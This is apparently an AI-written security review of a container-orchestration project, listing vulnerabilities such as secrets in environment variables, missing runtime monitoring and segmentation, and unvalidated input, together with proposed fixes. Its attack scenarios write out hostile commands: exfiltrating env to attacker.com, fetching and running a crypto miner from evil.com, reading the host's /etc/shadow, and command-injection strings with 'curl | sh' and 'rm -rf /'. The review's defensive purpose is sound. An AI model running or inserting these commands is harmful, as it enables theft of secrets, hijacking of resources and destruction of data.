# Obvious Vulnerabilities: Fix These First

**Question**: "Can you see anything obvious though now?"

**Answer**: Yes, 3 critical and obvious vulnerabilities that must be fixed before building the UI.

---

## 🔴 CRITICAL #1: Secrets in Environment Variables

### The Problem

**Current approach** (if following Docker/Kubernetes patterns):
```yaml
services:
  api:
    environment:
      - DATABASE_PASSWORD=supersecret123
      - API_KEY=sk-1234567890
```

**Why this is TERRIBLE**:
```bash
# Anyone with container access can read secrets
docker exec api-1 env
# DATABASE_PASSWORD=supersecret123  ← Visible in plain text!

# Secrets visible in docker inspect
docker inspect api-1 | grep -A 5 environment
# Shows all secrets

# Secrets visible in Kubernetes
kubectl describe pod api-1
# Shows all env vars including secrets

# Secrets logged to system logs
ps auxe | grep api
# Shows environment variables in process list

# Secrets in core dumps
# If container crashes, core dump may contain secrets
```

### Attack Time: **30 seconds**

```bash
# Step 1: List containers (5s)
docker ps

# Step 2: Exec into any container (5s)
docker exec api-1 sh

# Step 3: Read env vars (1s)
env | grep -i password
env | grep -i key
env | grep -i secret
env | grep -i token

# Step 4: Exfiltrate (1s)
curl -X POST http://attacker.com/exfil -d "$(env)"
```

**Result**: 🔴 **ALL SECRETS STOLEN**

### The Fix: Fjord (Secrets Manager)

**DO NOT put secrets in**:
- Environment variables ❌
- Config files ❌
- Docker/Kubernetes secrets (better, but still visible) ⚠️
- Git repositories ❌❌❌

**DO use**:
- **Fjord** (encrypted secrets manager) ✅
- Secrets injected at runtime only ✅
- Never stored in container image ✅
- Auto-rotation ✅
- Audit trail ✅

### Implementation Priority: **IMMEDIATE**

This is the **#1 most obvious vulnerability**. Build Fjord first, before any UI work.

---

## 🔴 CRITICAL #2: No Runtime Monitoring

### The Problem

**Current state**: Once containers are running, you have no visibility into:
- What processes are running inside containers
- What files are being accessed
- What network connections are being made
- Whether container breakout is being attempted

### Example Attack

```bash
# Attacker compromises nginx container
# Installs crypto miner (silent, runs in background)

docker exec nginx-1 sh
wget http://evil.com/xmrig
chmod +x xmrig
nohup ./xmrig -o pool.evil.com &

# Crypto miner runs forever
# You never notice until AWS bill arrives ($10,000!)
```

**Another example**:
```bash
# Container breakout attempt
docker exec nginx-1 sh

# Try to escape to host
mount -t proc proc /proc
cat /proc/1/root/etc/shadow  # Read host's password file

# If successful, attacker has root on HOST, not just container
```

### Attack Time: **2 minutes** (after initial compromise)

### The Fix: Cape (Runtime Security Monitor)

**What Cape would detect**:
- ✅ Unexpected processes (crypto miner detected immediately)
- ✅ Container breakout attempts (mount syscalls flagged)
- ✅ Unexpected network connections (outbound to evil.com blocked)
- ✅ File integrity violations (xmrig binary detected)
- ✅ Privilege escalation attempts

**How it works**:
```
eBPF monitors all syscalls
    ↓
Anomaly detected (unexpected mount)
    ↓
Alert sent to stapeln UI
    ↓
User sees: "🔴 Container nginx-1 attempting breakout!"
    ↓
[Kill Container] [Quarantine] [Investigate]
```

### Implementation Priority: **CRITICAL**

This is the **#2 most obvious vulnerability**. Without runtime monitoring, you're blind to attacks in progress.

---

## 🔴 CRITICAL #3: No Network Segmentation

### The Problem

**Current state**: All containers on same network can talk to each other freely.

```
┌─────────┐     ┌──────────┐     ┌──────────┐
│  nginx  │────→│   API    │────→│ Postgres │
│ (public)│     │ (private)│     │ (private)│
└─────────┘     └──────────┘     └──────────┘
     │                                  ▲
     └──────────────────────────────────┘
            ❌ NGINX CAN BYPASS API!
```

**Attack scenario**:
```bash
# Attacker compromises nginx (public-facing)
docker exec nginx-1 sh

# Scan internal network
nmap 172.17.0.0/16

# Find postgres directly accessible
psql -h 172.17.0.3 -U postgres

# BYPASS API ENTIRELY!
# No authentication, no rate limiting, no audit log
```

### Attack Time: **1 minute** (after initial compromise)

### The Fix: Strait (Network Policy Engine)

**Proper segmentation**:
```
┌─────────┐     ┌──────────┐     ┌──────────┐
│  nginx  │────→│   API    │────→│ Postgres │
│ (public)│  ✅ │ (private)│  ✅ │ (private)│
└─────────┘     └──────────┘     └──────────┘
     │                                  ▲
     └───────────────────────────────────┘
              ❌ BLOCKED BY POLICY
```

**Network policy**:
```yaml
# Only API can talk to database
nginx → postgres: ❌ DENY
nginx → API: ✅ ALLOW
API → postgres: ✅ ALLOW
```

**With mTLS**:
```
All connections encrypted with mutual TLS
Each service has cryptographic identity
Can't impersonate another service
```

### Implementation Priority: **CRITICAL**

This is the **#3 most obvious vulnerability**. One compromised container = entire network compromised.

---

## ⚠️  HIGH: Ephemeral Pinholes Too Long

### The Problem

**Current design**: Ephemeral pinholes can stay open up to 24 hours

```elixir
@max_duration 86400  # 24 hours
```

**Why this is risky**:
```bash
# User opens port 8080 for "quick test"
# Forgets about it
# Goes home for the day

# 12 hours later, attacker scans network
nmap public-ip
# Port 8080 open!

# Exploits service on port 8080
```

### Attack Time: **Anywhere from 1 minute to 24 hours** (race condition)

### The Fix: Reduce Maximum Duration

**Recommendation**:
```elixir
@max_duration 300    # 5 minutes (not 24 hours!)
@min_duration 30     # 30 seconds
@default_duration 60 # 1 minute default
```

**Better UX**:
```
User: "I need to test port 8080"
stapeln: "Opening port 8080 for 1 minute"
         "⏱️  59 seconds remaining"
         "⚠️  Closing in 10 seconds"
         "✅ Port closed"

User: "I need more time"
stapeln: "Extend for another minute?"
         [Yes] [No]
```

**Force user attention** - can't set and forget for 24 hours

### Implementation Priority: **HIGH** (easy fix)

---

## ⚠️  HIGH: No Input Validation on Component Names

### The Problem

**Current code** (Model.res):
```rescript
type component = {
  id: string,
  componentType: componentType,
  position: position,
  config: Js.Dict.t<string>,  // ← Any string! 🔴
}
```

**Attack vector**:
```bash
# User creates component with malicious name
Component name: nginx; curl http://evil.com/backdoor.sh | sh

# Or in port mapping
Port: 8080; rm -rf /

# Or in volume mount
Volume: /data; cat /etc/shadow > /tmp/pwned
```

**If these strings are passed to shell without sanitization**:
```bash
docker run --name "nginx; curl evil.com/backdoor | sh" ...
# Command injection! 🔴
```

### Attack Time: **30 seconds**

### The Fix: Strict Validation

**Whitelist-only validation**:
```rescript
// Only allow alphanumeric + dash + underscore
let isValidComponentName = (name: string): bool => {
  Js.Re.test_(%re("/^[a-zA-Z0-9_-]+$/"), name)
}

// Validate port (must be integer 1-65535)
let isValidPort = (port: string): bool => {
  switch Int.fromString(port) {
  | Some(n) => n >= 1 && n <= 65535
  | None => false
  }
}

// Validate volume path (must be absolute, no shell metacharacters)
let isValidVolumePath = (path: string): bool => {
  String.startsWith(path, "/") &&
  !Js.Re.test_(%re("/[;&|`$()]/"), path)
}
```

**Backend validation** (Elixir):
```elixir
defmodule Stapeln.Validation do
  @component_name_regex ~r/^[a-zA-Z0-9_-]+$/

  def validate_component_name(name) do
    if Regex.match?(@component_name_regex, name) do
      {:ok, name}
    else
      {:error, "Component name contains invalid characters"}
    end
  end
end
```

### Implementation Priority: **HIGH**

---

## ⚠️  HIGH: Default Settings Too Permissive

### The Problem

**Current defaults** (Settings.res):
```rescript
type settings = {
  defaultRuntime: Podman,  // ✅ Good
  autoVerifySignatures: bool,  // ⚠️  What's the default?
  requireSBOM: bool,  // ⚠️  What's the default?
  defaultCpuLimit: float,  // ⚠️  Unlimited by default?
  // ...
}
```

**If defaults are**:
```rescript
{
  autoVerifySignatures: false,  // ❌ BAD
  requireSBOM: false,  // ❌ BAD
  defaultCpuLimit: 0.0,  // ❌ Unlimited!
  allowPrivileged: true,  // ❌❌❌ TERRIBLE
}
```

**Then every new component is insecure by default!**

### The Fix: Secure Defaults

```rescript
// settings/defaults.res
// SPDX-License-Identifier: PMPL-1.0-or-later

let secureDefaults: settings = {
  defaultRuntime: Podman,  // ✅ Rootless by default
  autoVerifySignatures: true,  // ✅ Always verify
  requireSBOM: true,  // ✅ No SBOM = reject
  defaultCpuLimit: 1.0,  // ✅ 1 CPU max
  defaultMemoryLimit: 512,  // ✅ 512 MB max
  defaultUser: "appuser",  // ✅ Non-root
  readOnlyRootFs: true,  // ✅ Immutable
  allowPrivileged: false,  // ✅ Never privileged
  dropCapabilities: ["ALL"],  // ✅ Drop all caps
  noNewPrivileges: true,  // ✅ Can't escalate
}
```

**Rule**: **Secure by default, allow opt-out with confirmation**

```
User tries to enable privileged mode:

⚠️  WARNING: Dangerous Setting

Enabling privileged mode allows containers to:
• Access host devices
• Load kernel modules
• Potentially break out of container

This is RARELY needed and creates significant security risk.

Are you absolutely sure?
[No, Keep Safe] [Yes, Enable (I Know The Risks)]
```

### Implementation Priority: **HIGH**

---

## Summary: Build These First (Before UI)

### Phase 0: Security Foundation (Do This First!)

**Week 1-2: Fjord (Secrets Manager)** 🔴 CRITICAL
- Encrypted secrets storage
- Runtime injection only
- Auto-rotation
- Audit trail

**Week 3-4: Cape (Runtime Monitor)** 🔴 CRITICAL
- eBPF syscall monitoring
- Container breakout detection
- Crypto miner detection
- Process anomaly detection

**Week 5-6: Strait (Network Policy)** 🔴 CRITICAL
- Zero-trust segmentation
- mTLS between services
- Policy enforcement
- Network isolation

**Week 7: Security Hardening** ⚠️  HIGH
- Input validation (whitelist-only)
- Secure defaults
- Ephemeral pinhole limits (5 min max)
- Fuzz testing

### Then Phase 1: Configuration UI

**Week 8+: stapeln UI**
- Visual designer
- Game-like interface
- Attack surface analyzer
- Built on top of secure foundation

---

## Why Security First?

### 1. **Can't Bolt Security On Later**

```
❌ Bad Approach:
Build UI → Deploy → Users adopt → "Oh no, secrets leak!" → Try to fix

✅ Good Approach:
Build security → Build UI on top → Deploy → Secure from day 1
```

### 2. **Users Won't Notice (Until It's Too Late)**

```
User: "This UI is beautiful!"
Attacker: *steals all secrets via env vars*
User: "Oh no! Our database was breached!"

vs.

User: "This UI is beautiful!"
Attacker: *tries to steal secrets*
Fjord: "Access denied, logged, alerted"
User: "Why didn't anything bad happen?"
You: "Because we built security first 😎"
```

### 3. **Your Son Will Test It**

```
Son: "Let me try this container thing you built..."
         *2 minutes later*
Son: "I have all your database passwords"
You: "😱"

vs.

Son: "Let me try this container thing you built..."
         *2 hours later*
Son: "Okay fine, I can't break it. Not bad."
You: "🎯"
```

---

## Recommended Build Order

### Priority 1: Core Security (6 weeks)
1. Fjord (secrets manager)
2. Cape (runtime monitor)
3. Strait (network policy)
4. Input validation
5. Secure defaults
6. Ephemeral pinhole limits

### Priority 2: Configuration UI (4 weeks)
7. stapeln frontend (ReScript)
8. Game-like interface
9. Attack surface analyzer
10. Simulation mode

### Priority 3: Advanced Security (2 weeks)
11. Hnitbjorg (registry)
12. Dáinsleif (HSM/key management)

### Priority 4: Polish (2 weeks)
13. User testing
14. Documentation
15. "Break My Stack" challenge with your son

**Total**: 14 weeks to fully secure, polished system

---

## The Obvious Vulnerabilities (Summary)

**What's obvious right now?**

1. 🔴 **Secrets in environment variables** - Instant pwn (30 seconds)
2. 🔴 **No runtime monitoring** - Blind to attacks in progress (2 minutes)
3. 🔴 **No network segmentation** - One breach = all breached (1 minute)
4. ⚠️  **Ephemeral pinholes too long** - 24 hours is risky (reduce to 5 min)
5. ⚠️  **No input validation** - Command injection risk (30 seconds)
6. ⚠️  **Insecure defaults** - Every component vulnerable by default

**Fix these BEFORE building the pretty UI.**

**Then your son can't destroy it in 2 seconds, 2 minutes, OR 2 hours.** 🔒

---

**Document Version**: 1.0
**Last Updated**: 2026-02-05
**Status**: Security foundation design - ready for implementation
**Recommendation**: Build Fjord, Cape, Strait FIRST, then stapeln UI
